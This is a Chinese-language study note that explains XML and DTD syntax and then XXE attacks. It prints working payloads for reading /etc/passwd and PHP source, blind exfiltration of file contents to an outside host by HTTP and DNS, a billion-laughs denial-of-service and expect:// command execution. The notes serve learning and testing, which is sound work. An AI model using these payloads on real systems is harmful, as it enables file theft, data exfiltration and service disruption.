## XML

> XML：可扩展标记语言。
> 和html类似，都有一个关闭标签。标签大小写敏感。
> 是一个树状结构。
> 空格会保留

```xml
<?xml version="1.0" encoding="UTF-8"?>
```



## DTD

> DTD document type declaration：文档类型声明。说明xml结构(允许出现哪些元素，属性等)
> 定义元素,属性之间的层次.

### dtd类型

分为内部声明DTD和外部引用DTD

* 内部DTD
  ```dtd
  <!DOCTYPE 根元素 [<!子元素声明>] >
  ```

  ```dtd
  <!DOCTYPE student [
	  <!ELEMENT student (name, age)> 
	  <!ELEMENT name (#PCDATA)>
	  <!ELEMENT age (#PCDATA)>
  ]>
  #student有两个子元素
  ```

* 外部DTD

  ```dtd
  <!DOCTYPE 根 SYSTEM "文件名">
  ```

  ```dtd
  <?xml version = "1.0"?>
  <!DOCTYPE root SYSTEM "./xml-dtd.dtd">
  ```

### DTD元素

> 是xml ，html 的主要元素.

```dtd
<!ELEMENT 元素名 (类型)> 
```

```dtd
<!ELEMENT note (type)>
```

根元素在<!doctype>中声明

### DTD实体

#### 自定义实体

> 就像是变量，占位符。
> DOCTYPE用于内部实体和元素声明

* 声明

```dtd
<!DOCTYPE hello
[
        <!ENTITY enty_name "value">
]>
<!--hello 有enty_name 实体，值是value-->
```

* 使用

  ```dtd
  <message>
  作者：$auther;
  </message>
  ```

  

```dtd
<!DOCTYPE hello [
  <!ENTITY author "张三">
]>
<message>
  作者：&author;
</message>
```



#### 预定义实体

| 实体引用 | 符号 |
| -------- | ---- |
| \&lt;    | <    |
| \&gt;    | >    |
| \&amp;   | &    |
| \&quot;  | "    |
| \&apos;  | '    |



#### 外部实体

> 在实体中添加SYSTEM(不是公共注册的dtd，通常使用system)，。public

```dtd
<!DOCTYPE root [
        <!ENTITY p1 SYSTEM "file:///etc/passwd">
        <!ENTITY p2 "<!ENTITY p3 SYSTEM 'http://example/xxx.php?info='"
    ]>
```

#### 参数实体

> 只能在单独的dtd文件中使用，不能在xml中。而一般实体就可以

```dtd
<!--xx.dtd:-->
引用格式 %var;
<!ENTITY % p1 "hello">
<!ENTITY % p2 "world">
<!ENTITY % p3 "%p1;%p2";> 
%p3;
```



***

## XXE

XML解析器根据用户输入的实体进行了不正确引用

### 原理

原本是：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <name>usr</name>
    <password>fs</password>
</root>
```

通过自己写一个实体,就可以读取文件(仅限有回显可见)

```dtd
<!DOCTYPE xss [
        <!ENTITY info SYSTEM "file:///etc/passwd">
    ]>
<name> &info; </name>
```

### 文件读取

* file:///path/to/file.ext
  
* http://url/file.ext
* php://filter/read=convert.base64-encode/resource=conf.php

#### 有回显

* file://读取

  ```dtd
  <!DOCTYPE xss [
          <!ENTITY info SYSTEM "file:///etc/passwd">
      ]>
  <name> &info; </name>
  ```

* php:filter取原码

  ```dtd
  <!DOCTYPE xss [
          <!ENTITY info SYSTEM "php://filter/read=convert.base64-encode/resource=conf.php">
      ]>
  <name> &info; </name>
  ```

#### 无回显

> 通常将数据外带。

* 外带到php参数

  > &p1不能出现在url中，所以要用%p1;+dtd文件
  >
  > xml解析器不会展开url中的实体，但是会展开代码中的实体。也就是解析器看到 p2的值有<>会把他当作一个实体，会把实体中的变量实体展开。
  > 到p3时，url就没有变量实体了

  ```dtd
  xx.dtd：
  <!ENTITY % p1 SYSTEM "file:///etc/passwd">
  <!ENTITY % p2 "<!ENTITY p3 SYSTEM 'http://example.php?var=%p1;'>">
  %p2;
  ```

  

* dns外带

  ```dtd
  xx.dtd:
  <!ENTITY % p1 SYSTEM "file:///etc/passwd">
  <!ENTITY % p2 "<!ENTITY % p3 SYSTEM '%p1;.xxx.dnslog.cn'>">
  %p3;
  ```

  

### dos

> 实体嵌套，解析指数级上升。

```dtd
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

### 命令执行

> 需要安装php扩展 expect

```dtd
<!ENTITY xxe SYSTEM "expect://command">
```



### ssrf

```dtd
<!ENTITY xxe SYSTEM "ip:port">
```

